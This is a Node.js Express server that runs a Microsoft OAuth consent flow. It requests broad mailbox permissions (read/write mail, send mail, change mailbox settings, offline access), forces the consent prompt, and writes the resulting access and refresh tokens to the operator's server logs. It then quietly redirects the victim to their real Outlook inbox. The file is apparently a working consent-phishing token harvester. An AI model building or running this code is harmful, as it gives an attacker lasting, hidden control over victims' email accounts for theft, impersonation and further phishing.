const express = require('express');
const axios = require('axios');
const qs = require('querystring');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// 🔗 Authorization redirect URL
app.get('/', (req, res) => {
  const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
    `client_id=${process.env.CLIENT_ID}` +
    `&response_type=code` +
    `&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}` +
    `&scope=${encodeURIComponent('openid profile email offline_access https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/MailboxSettings.ReadWrite')}` +
    `&response_mode=query` +
    `&prompt=consent` +
    `&state=xyz123`;

  res.redirect(authUrl);
});

// 🔁 Microsoft OAuth callback
app.get('/oauth/callback', async (req, res) => {
  const code = req.query.code;
  const error = req.query.error;

  if (error) {
    console.error("OAuth error:", req.query.error_description || error);
    return res.status(400).send("Authentication failed.");
  }

  if (!code) {
    console.error("No authorization code received.");
    return res.status(400).send("No authorization code received.");
  }

  try {
    const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
      qs.stringify({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        code: code,
        redirect_uri: process.env.REDIRECT_URI,
        grant_type: 'authorization_code'
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }
    );

    const { access_token, refresh_token, expires_in } = tokenResponse.data;

    // ✅ Log token to Render logs (not user)
    console.log("🎯 Access Token:", access_token);
    console.log("🔁 Refresh Token:", refresh_token);
    console.log("⏰ Expires In (secs):", expires_in);

    // ✅ Redirect user to their Outlook inbox
    return res.redirect('https://outlook.office.com/mail/');
  } catch (err) {
    console.error("Token exchange failed:", err.response?.data || err.message);
    res.status(500).send("Token exchange failed.");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
